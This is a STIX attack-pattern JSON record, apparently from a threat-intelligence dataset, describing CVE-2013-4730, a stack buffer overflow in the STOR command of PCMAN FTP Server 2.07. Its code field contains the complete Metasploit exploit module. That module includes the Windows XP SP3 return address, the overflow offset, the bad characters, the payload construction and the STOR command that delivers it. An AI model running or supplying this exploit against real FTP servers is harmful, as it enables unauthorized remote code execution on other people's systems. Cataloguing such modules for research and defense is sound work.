{
    "type": "attack-pattern",
    "spec_version": "2.1",
    "id": "attack-pattern--1fc1fea1-f47c-4c8d-93e1-1142a9d4bd2d",
    "created": "2024-08-14T16:50:50.473292Z",
    "modified": "2024-08-14T16:50:50.473296Z",
    "name": "PCMAN FTP Server Post-Authentication STOR Command Stack Buffer Overflow",
    "description": " This module exploits a buffer overflow vulnerability found in the STOR command of the PCMAN FTP v2.07 Server when the \"/../\" parameters are also sent to the server. Please note authentication is required in order to trigger the vulnerability. The overflowing string will also be seen on the FTP server log console. ",
    "external_references": [
        {
            "source_name": "metasploit",
            "url": "https://github.com/rapid7/metasploit-framework/blob/master/exploits/windows/ftp/pcman_stor.rb",
            "external_id": "pcman_stor.rb"
        },
        {
            "source_name": "CVE",
            "external_id": "2013-4730"
        }
    ],
    "x_code_snippet": "##\n# This module requires Metasploit: https://metasploit.com/download\n# Current source: https://github.com/rapid7/metasploit-framework\n##\n\nclass MetasploitModule < Msf::Exploit::Remote\n  Rank = NormalRanking\n\n  include Msf::Exploit::Remote::Ftp\n\n  def initialize(info = {})\n    super(update_info(info,\n      'Name'           => 'PCMAN FTP Server Post-Authentication STOR Command Stack Buffer Overflow',\n      'Description'    => %q{\n          This module exploits a buffer overflow vulnerability found in the STOR command of the\n          PCMAN FTP v2.07 Server when the \"/../\" parameters are also sent to the server. Please\n          note authentication is required in order to trigger the vulnerability. The overflowing\n          string will also be seen on the FTP server log console.\n      },\n      'Author'         =>\n          [\n            'Christian (Polunchis) Ramirez', # Initial Discovery\n            'Rick (nanotechz9l) Flores'      # Metasploit Module\n          ],\n      'License'        => MSF_LICENSE,\n      'References'     =>\n        [\n          [ 'CVE', '2013-4730' ],\n          [ 'OSVDB', '94624'],\n          [ 'EDB',   '27703']\n        ],\n      'DefaultOptions' =>\n        {\n          'EXITFUNC' => 'process',\n          'VERBOSE'  => true\n        },\n      'Payload'        =>\n        {\n          'Space'   => 1000,\n          'BadChars'  => \"\\x00\\xff\\x0a\\x0d\\x20\\x40\",\n        },\n      'Platform'       => 'win',\n      'Targets'        =>\n        [\n          [ 'Windows XP SP3 English',\n            {\n              'Ret' => 0x77c35459, # push esp ret C:\\WINDOWS\\system32\\msvcrt.dll\n              'Offset' => 2011\n            }\n          ],\n        ],\n      'DisclosureDate' => '2013-06-27',\n      'DefaultTarget'  => 0))\n  end\n\n  def post_auth?\n    true\n  end\n\n  def check\n    c = connect_login\n    disconnect\n\n    if c and banner =~ /220 PCMan's FTP Server 2\\.0/\n      # Auth is required to exploit\n      vprint_status(\"Able to authenticate, and banner shows the vulnerable version\")\n      return Exploit::CheckCode::Appears\n    elsif not c and banner =~ /220 PCMan's FTP Server 2\\.0/\n      vprint_status(\"Unable to authenticate, but banner shows the vulnerable version\")\n      # Auth failed, but based on version maybe the target is vulnerable\n      return Exploit::CheckCode::Appears\n    end\n\n    return Exploit::CheckCode::Safe\n  end\n\n\n  def exploit\n    c = connect_login\n\n    # Auth failed. The mixin should show the error, so we just bail.\n    return unless c\n\n    # Username is part of the overflowing string, so we need to account for that length\n    user_length = datastore['FTPUSER'].to_s.length\n\n    print_status(\"Trying victim #{target.name}...\")\n    sploit = rand_text_alpha(target['Offset'] - user_length)\n    sploit << [target.ret].pack('V')\n    sploit << make_nops(4)\n    sploit << payload.encoded\n    sploit << rand_text_alpha(sploit.length)\n\n    send_cmd( [\"STOR\", \"/../\" + sploit], false )\n    disconnect\n  end\nend\n",
    "x_mitre_disclosure_date": "2013-06-27",
    "x_mitre_platforms": [
        "win'"
    ]
}